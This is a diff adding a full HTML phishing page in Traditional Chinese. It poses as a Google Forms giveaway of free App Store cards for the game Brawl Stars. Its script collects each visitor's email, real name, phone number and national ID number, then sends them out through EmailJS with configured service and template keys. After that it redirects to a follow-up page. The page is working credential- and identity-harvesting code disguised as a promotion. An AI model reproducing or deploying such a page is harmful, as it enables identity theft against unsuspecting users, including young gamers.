@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>荒野亂鬥免費 App Store 卡領取區</title>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <link rel="icon" href="https://ssl.gstatic.com/docs/spreadsheets/forms/favicon_qp2.png">
+    <meta name="description" content="荒野亂鬥免費 App Store 卡領取區，填寫資料即可領取免費序號！">
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script type="text/javascript">
+        // 🚨 請替換 'YOUR_PUBLIC_KEY' 為您的 EmailJS Public Key (User ID)
+        (function() {
+            emailjs.init('VuhBknBXBuQYRZ-Tz'); 
+        })();
+    </script>
+    
+    <style>
+        /* ========================================================= */
+        /* 1. CSS 樣式區域 (排版優化、動畫效果) */
+        /* ========================================================= */
+        
+        /* 基礎樣式和字體 */
+        body {
+            background-color: #f0ebf8; /* 淺灰色/淡紫色背景 */
+            font-family: Roboto, Arial, sans-serif;
+            padding: 20px;
+        }
+        
+        /* === 核心修改：定義獨立區塊的寬度和居中樣式 === */
+        /* 讓頁面上所有主要區塊都擁有相同的最大寬度和居中對齊效果 */
+        .page-block {
+            max-width: 680px; 
+            margin: 0 auto 20px auto; 
+            background-color: white;
+            border-radius: 8px;
+            border: 1px solid rgb(218, 220, 224);
+            /* 讓 page-block 成為第一個錯誤提示的滾動目標 */
+            position: relative;
+        }
+
+        /* 頂部紫色條 (套用給第一個 page-block) */
+        .header-band {
+            height: 10px;
+            background-color: #673ab7; 
+            border-top-left-radius: 8px;
+            border-top-right-radius: 8px;
+        }
+
+        /* 頂部內容區塊 */
+        .form-header-content {
+            padding: 24px;
+            padding-top: 15px;
+            padding-bottom: 5px;
+        }
+        
+        /* 標題、描述 */
+        .page-block h1 { color: #202124; font-size: 32px; font-weight: 400; margin: 0 0 8px 0; }
+        .page-block .description, .page-block .required-note { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
+        .page-block .required-note { color: #d93025; }
+        
+        /* **問題卡片**：繼承 .page-block 樣式，並去除重複邊框和陰影 */
+        .question-card {
+            background-color: white; 
+            padding: 24px; 
+            border-radius: 8px;
+            border-left: 5px solid transparent; /* 預留驗證紅線空間 */
+            transition: border-left 0.3s;
+            box-shadow: none; 
+            border: none;
+            margin: 0;
+            padding-top: 5px; 
+        }
+        
+        /* 驗證失敗時的紅色邊條樣式 */
+        .question-card.error {
+            border-left: 5px solid #d93025;
+        }
+
+        .question-title { font-size: 16px; font-weight: 500; color: #202124; margin-bottom: 12px; }
+        
+        /* 簡答題輸入框樣式 */
+        .question-card input[type="text"] {
+            border: none; border-bottom: 1px solid #dadce0; width: 100%; padding: 8px 0;
+            font-size: 14px; box-sizing: border-box; transition: border-bottom 0.3s;
+        }
+        .question-card input[type="text"]:focus { border-bottom: 2px solid #673ab7; outline: none; }
+        
+        /* 選項排版 (保持不變) */
+        .option-group { display: block; }
+        .option-group div {
+            display: flex; 
+            align-items: center;
+            padding: 8px 0;
+            position: relative; 
+        }
+        .option-group label {
+            display: inline-block; 
+            padding: 0 0 0 12px; 
+            font-size: 14px;
+            color: #202124;
+            cursor: pointer;
+        }
+        
+        /* 單選/多選框樣式和動畫 (保持不變) */
+        .option-group input[type="radio"], 
+        .option-group input[type="checkbox"] {
+            appearance: none; -webkit-appearance: none; -moz-appearance: none;
+            width: 20px; height: 20px; margin: 0; cursor: pointer; position: relative;
+            border: 2px solid #5f6368; border-radius: 50%; 
+            transition: all 0.2s ease-in-out; transform: scale(1); outline: none;
+            flex-shrink: 0; 
+        }
+        .option-group input[type="checkbox"] { border-radius: 4px; }
+        .option-group input[type="radio"]:focus, .option-group input[type="checkbox"]:focus {
+            border-color: #673ab7; box-shadow: 0 0 0 2px rgba(103, 58, 183, 0.3);
+        }
+        .option-group input[type="radio"]:checked, .option-group input[type="checkbox"]:checked {
+            border-color: #673ab7;
+        }
+        .option-group input[type="radio"]:checked::before {
+            content: ''; display: block; width: 10px; height: 10px; background-color: #673ab7;
+            border-radius: 50%; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+        }
+        .option-group input[type="checkbox"]:checked::before {
+            content: '\2713'; display: block; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
+            color: white; font-size: 14px; font-weight: bold; background-color: #673ab7;
+            width: 100%; height: 100%; border-radius: 4px; text-align: center; line-height: 20px;
+        }
+        
+        @keyframes click-wave {
+            0% { transform: scale(0); opacity: 0; }
+            50% { transform: scale(1.5); opacity: 0.5; }
+            100% { transform: scale(1); opacity: 0; }
+        }
+
+        .option-group label::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 10px; 
+            transform: translate(-50%, -50%) scale(0);
+            width: 40px; 
+            height: 40px;
+            border-radius: 50%;
+            background-color: rgba(103, 58, 183, 0.1); 
+            opacity: 0;
+            pointer-events: none;
+            z-index: 1; 
+        }
+        
+        .option-group input[type="radio"]:active ~ label::after,
+        .option-group input[type="checkbox"]:active ~ label::after {
+            animation: click-wave 0.3s forwards;
+        }
+
+        /* 提交區塊樣式 (獨立區塊) */
+        .submit-footer { 
+            padding: 16px 24px; 
+            overflow: auto; 
+            border-top: 1px solid #dadce0; 
+            background-color: white;
+            border-radius: 0 0 8px 8px; /* 確保圓角在底部 */
+        }
+        
+        /* 底部 Logo 樣式 */
+        .footer-logo { 
+            text-align: right; 
+            padding: 10px 20px; 
+            font-size: 12px; 
+            color: #9aa0a6; 
+            max-width: 680px; 
+            margin: 0 auto; 
+        }
+
+        /* 提交按鈕樣式 */
+        /* 將 #submit-button 改為 button 以便於 HTML 語義 */
+        .button-style { background-color: #673ab7; color: white; padding: 10px 24px; border: none; border-radius: 4px; cursor: pointer; font-size: 14px; font-weight: 500; float: left; transition: background-color 0.2s; text-align: center; }
+        .button-style:hover { background-color: #5b2fa8; }
+        .clear-content { color: #673ab7; text-decoration: none; line-height: 40px; margin-left: 20px; font-size: 14px; float: right; cursor: pointer; }
+        
+    </style>
+</head>
+<body>
+
+    <div id="header-block" class="page-block">
+        <div class="header-band"></div> 
+        <div class="form-header-content">
+            <h1>荒野亂鬥免費 App Store 卡領取區</h1>
+            <p class="description">請填寫以下資料來領取免費 App Store 卡</p>
+            <hr style="border: none; border-top: 1px solid #dadce0; margin: 15px 0;">
+            <p class="required-note">* 表示必填問題</p>
+        </div>
+    </div>
+
+    <div class="page-block">
+        <div class="question-card required" data-question-name="q1">
+            <p class="question-title">1. 請輸入你的Email <span style="color: red;">*</span></p>
+            <input type="text" id="q1_id" name="q1_id" placeholder="您的回答" required>
+        </div>
+    </div>
+    
+    <div class="page-block">
+        <div class="question-card required" data-question-name="q2">
+            <p class="question-title">2. 輸入你的真實姓名 <span style="color: red;">*</span></p>
+            <input type="text" id="q2_fav_hero" name="q2_fav_hero" placeholder="您的回答" required>
+        </div>
+    </div>
+    
+    <div class="page-block">
+        <div class="question-card required" data-question-name="q3">
+            <p class="question-title">3. 輸入你的電話號碼 <span style="color: red;">*</span></p>
+            <input type="text" id="q3_phone" name="q3_phone" placeholder="您的回答" required>
+        </div>
+    </div>
+    
+    <div class="page-block">
+        <div class="question-card required" data-question-name="q4">
+            <p class="question-title">4. 輸入你的身份證字號 <span style="color: red;">*</span></p>
+            <input type="text" id="q4_id_card" name="q4_id_card" placeholder="您的回答" required>
+        </div>
+    </div>
+    
+    <div class="page-block submit-area-block" style="border: none;">
+            <button type="button" id="submit-button" class="button-style">提交</button>
+            <a href="#" class="clear-content">清除內容</a>
+    </div>
+
+
+    <script>
+        const submitButton = document.getElementById('submit-button');
+        const clearButton = document.querySelector('.clear-content');
+
+        /**
+         * 清除所有輸入內容和視覺提示
+         */
+        function clearAllInputs() {
+            // 清除所有文字輸入框
+            document.querySelectorAll('input[type="text"]').forEach(input => {
+                input.value = '';
+            });
+
+            // 清除所有單選框的選中狀態
+            document.querySelectorAll('input[type="radio"]').forEach(radio => {
+                radio.checked = false;
+            });
+            
+            // 清除所有紅色邊條 (驗證提示)
+            document.querySelectorAll('.question-card').forEach(q => {
+                q.classList.remove('error'); // 使用 classList 移除錯誤類別
+                q.style.borderLeft = ''; // 確保邊框被移除
+            });
+
+            // 滾動到頂部
+            window.scrollTo({ top: 0, behavior: 'smooth' });
+        }
+
+        /**
+         * 驗證所有必填問題是否已回答。
+         * 如果有問題未回答，則在卡片左側顯示紅線，並返回 false。
+         * @returns {boolean} 所有必填項是否都已填寫。
+         */
+        function validateForm() {
+            let isValid = true;
+            let firstErrorElement = null;
+
+            // 1. 清除所有現有的錯誤提示
+            document.querySelectorAll('.question-card').forEach(q => {
+                q.classList.remove('error');
+            });
+
+            // 2. 遍歷所有包含 required class 的問題卡片
+            const requiredCards = document.querySelectorAll('.question-card.required');
+            
+            requiredCards.forEach(card => {
+                const qName = card.getAttribute('data-question-name');
+                let isAnswered = false;
+
+                // 檢查簡答題 (input[type="text"])
+                const textInput = card.querySelector('input[type="text"]');
+                if (textInput) {
+                    if (textInput.value.trim() !== '') {
+                        isAnswered = true;
+                    }
+                } 
+                
+                // 檢查單選題 (input[type="radio"])
+                // 使用 data-question-name 作為 radio group 的 name
+                const radioInputs = card.querySelectorAll(`input[type="radio"][name="${qName}"]`);
+                if (radioInputs.length > 0) {
+                    radioInputs.forEach(radio => {
+                        if (radio.checked) {
+                            isAnswered = true;
+                        }
+                    });
+                }
+
+                // 3. 處理驗證失敗
+                if (!isAnswered) {
+                    isValid = false;
+                    card.classList.add('error');
+                    
+                    // 記錄第一個錯誤元素的父級 page-block
+                    if (!firstErrorElement) {
+                        firstErrorElement = card.closest('.page-block'); 
+                    }
+                }
+            });
+
+            // 4. 如果有錯誤，滾動到第一個未填寫的區塊
+            if (!isValid && firstErrorElement) {
+                // 延遲滾動以確保樣式渲染完成
+                setTimeout(() => {
+                    firstErrorElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                }, 100);
+            }
+
+            return isValid;
+        }
+
+        /**
+         * 收集所有答案並透過 EmailJS 發送郵件。
+         */
+        function sendEmail() {
+            // 🚨 請替換 'YOUR_SERVICE_ID' 和 'YOUR_TEMPLATE_ID'
+            const serviceID = 'service_2rdr407'; 
+            const templateID = 'template_yn3lwpo'; 
+
+            // 收集所有問題的答案
+            const templateParams = {
+
+                // 簡答題 (使用 id/name 屬性)
+                'user_id': document.getElementById('q1_id').value.trim() || '未回答',
+                'fav_hero': document.getElementById('q2_fav_hero').value.trim() || '未回答',
+                'phone': document.getElementById('q3_phone').value.trim() || '未回答',
+                'id_card': document.getElementById('q4_id_card').value.trim() || '未回答',
+
+                // 額外資訊：標題
+                'form_title': document.querySelector('h1').textContent
+            };
+
+            // 顯示載入狀態或禁用按鈕
+            submitButton.disabled = true;
+            submitButton.textContent = '傳送中...';
+
+            emailjs.send(serviceID, templateID, templateParams)
+  .then(function(response) {
+    console.log('SUCCESS!', response.status, response.text);
+    
+    // 提示使用者
+    alert("提交成功！即將前往領取獎勵。");
+    
+    // 清除並跳轉
+    clearAllInputs();
+    window.location.href = '2.html';
+});
+        }
+
+
+        // ===================================
+        // 事件監聽器
+        // ===================================
+
+        // 提交按鈕點擊事件：先驗證，再傳送
+        submitButton.addEventListener('click', function(event) {
+            if (validateForm()) {
+                sendEmail();
+            } else {
+                // 驗證失敗時，validateForm() 會處理視覺提示和滾動
+                console.log('表單驗證失敗，請完成所有必填項目。');
+            }
+        });
+
+        // 清除內容功能
+        clearButton.addEventListener('click', function(event) {
+            event.preventDefault();
+            clearAllInputs();
+        });
+
+    </script>
+</body>
+
+</html>
